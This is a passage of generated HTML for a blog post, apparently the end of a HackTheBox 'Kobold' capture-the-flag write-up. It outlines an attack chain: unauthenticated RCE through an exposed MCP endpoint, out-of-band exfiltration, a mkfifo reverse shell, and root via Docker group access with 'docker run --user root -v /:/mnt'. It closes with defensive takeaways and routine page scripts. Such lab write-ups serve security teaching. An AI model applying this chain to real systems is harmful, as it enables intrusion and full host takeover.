+<h2 id="why---entrypoint-sh-was-necessary">Why <code>--entrypoint sh</code> Was Necessary<a hidden class="anchor" aria-hidden="true" href="#why---entrypoint-sh-was-necessary">#</a></h2>
+<p>The default entrypoint (<code>/etc/init.d/rc.local</code>) starts PHP-FPM and nginx, then drops to <code>nobody</code>. Without overriding it, the container still runs as an unprivileged user even though the image is available. The <code>--user root</code> flag alone is insufficient if the entrypoint later switches users — overriding the entrypoint entirely bypasses this.</p>
+<hr>
+<h2 id="attack-chain-summary">Attack Chain Summary<a hidden class="anchor" aria-hidden="true" href="#attack-chain-summary">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Subdomain enum → mcp.kobold.htb (MCPJam)
+</span></span><span class="line"><span class="cl">        ↓
+</span></span><span class="line"><span class="cl">CVE-2026-23744 — Unauthenticated RCE via /api/mcp/connect
+</span></span><span class="line"><span class="cl">        ↓
+</span></span><span class="line"><span class="cl">Blind RCE as ben → out-of-band exfil → mkfifo reverse shell
+</span></span><span class="line"><span class="cl">        ↓
+</span></span><span class="line"><span class="cl">User flag (/home/ben/user.txt)
+</span></span><span class="line"><span class="cl">        ↓
+</span></span><span class="line"><span class="cl">ben is in operator group → Docker socket access (newgrp docker)
+</span></span><span class="line"><span class="cl">        ↓
+</span></span><span class="line"><span class="cl">docker run --user root -v /:/mnt → host filesystem as root
+</span></span><span class="line"><span class="cl">        ↓
+</span></span><span class="line"><span class="cl">Root flag (/root/root.txt)
+</span></span></code></pre></div><hr>
+<h2 id="key-takeaways">Key Takeaways<a hidden class="anchor" aria-hidden="true" href="#key-takeaways">#</a></h2>
+<ul>
+<li><strong>MCP servers expose powerful process-spawning APIs</strong> — any internet-facing MCP endpoint must enforce strong authentication and command whitelisting. The MCP protocol was designed for local trusted use, not public exposure.</li>
+<li><strong>Blind RCE requires out-of-band exfiltration</strong> — stdout is consumed by the MCP protocol layer; HTTP callbacks are the reliable exfil path.</li>
+<li><strong>Docker group = root</strong> — membership in the Docker group is functionally equivalent to passwordless sudo on the host.</li>
+<li><strong>PrivateBin&rsquo;s zero-knowledge design held</strong> — even with full filesystem and container access, encrypted pastes could not be read without the URL fragment decryption key.</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/cve-2026-23744/">CVE-2026-23744</a></li>
+      <li><a href="http://localhost:1313/tags/mcp/">MCP</a></li>
+      <li><a href="http://localhost:1313/tags/rce/">RCE</a></li>
+      <li><a href="http://localhost:1313/tags/docker-escape/">Docker Escape</a></li>
+      <li><a href="http://localhost:1313/tags/privatebin/">PrivateBin</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/writeups/hackthebox/conversor/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>HTB-Conversor</span>
+  </a>
+  <a class="next" href="http://localhost:1313/writeups/hackthebox/interpreter/">
+    <span class="title">Next »</span>
+    <br>
+    <span>HTB-Interpreter</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2026 <a href="http://localhost:1313/">the008Killer</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
